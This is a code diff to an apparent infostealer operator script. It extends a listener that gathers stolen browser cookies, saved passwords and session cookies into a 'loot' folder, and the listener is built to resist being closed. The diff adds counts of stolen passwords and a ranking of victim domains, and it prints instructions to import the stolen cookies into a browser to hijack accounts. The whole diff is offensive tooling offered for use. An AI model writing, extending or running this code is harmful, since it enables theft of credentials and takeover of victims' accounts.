@@ -317,8 +317,11 @@ def start_listener(port, telegram=None, discord=None):
     Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
     closing the main terminal). Output is also written to loot/listener.log."""
     os.makedirs(LOOT, exist_ok=True)
-    # clean old loot
-    for f in ["cookies.json", "cookies.txt", "session_cookies.json", "session_cookies.txt",
+    # clean old loot (both old and new filenames)
+    for f in ["all_cookies.json", "all_cookies.txt",
+              "passwords.json", "passwords.txt",
+              "session_cookies.json", "session_cookies.txt",
+              "cookies.json", "cookies.txt",  # legacy names
               "listener.log"]:
         p = os.path.join(LOOT, f)
         if os.path.exists(p):
@@ -341,8 +344,10 @@ def start_listener(port, telegram=None, discord=None):
     return proc
 
 def wait_for_cookies(timeout=300):
-    """Wait for cookies.json to appear in loot/. Print summary when done."""
-    json_path = os.path.join(LOOT, "cookies.json")
+    """Wait for loot/all_cookies.json to appear in loot/. Print summary when done."""
+    json_path = os.path.join(LOOT, "all_cookies.json")
+    pwd_path = os.path.join(LOOT, "passwords.json")
+    sess_path = os.path.join(LOOT, "session_cookies.json")
     log("[*] waiting for cookies (timeout=%ds, Ctrl+C to stop)..." % timeout)
     start = time.time()
     while time.time() - start < timeout:
@@ -353,9 +358,24 @@ def wait_for_cookies(timeout=300):
                 if data:
                     log("\n[+] %d cookies received!" % len(data))
                     log("    -> %s (%d bytes)" % (json_path, os.path.getsize(json_path)))
-                    txt_path = os.path.join(LOOT, "cookies.txt")
-                    if os.path.isfile(txt_path):
-                        log("    -> %s (%d bytes)" % (txt_path, os.path.getsize(txt_path)))
+                    # passwords
+                    pwd_count = 0
+                    if os.path.isfile(pwd_path):
+                        try:
+                            with open(pwd_path, encoding="utf-8") as f:
+                                pwd_count = len(json.load(f))
+                        except Exception:
+                            pass
+                        log("    -> %s (%d passwords)" % (pwd_path, pwd_count))
+                    # session
+                    sess_count = 0
+                    if os.path.isfile(sess_path):
+                        try:
+                            with open(sess_path, encoding="utf-8") as f:
+                                sess_count = len(json.load(f))
+                        except Exception:
+                            pass
+                        log("    -> %s (%d session cookies)" % (sess_path, sess_count))
                     # top domains
                     top = {}
                     for c in data:
@@ -364,7 +384,7 @@ def wait_for_cookies(timeout=300):
                     log("\n    top domains:")
                     for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
                         log("      %5d  %s" % (n, d))
-                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/cookies.json")
+                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/all_cookies.json")
                     return True
             except (json.JSONDecodeError, IOError):
                 pass
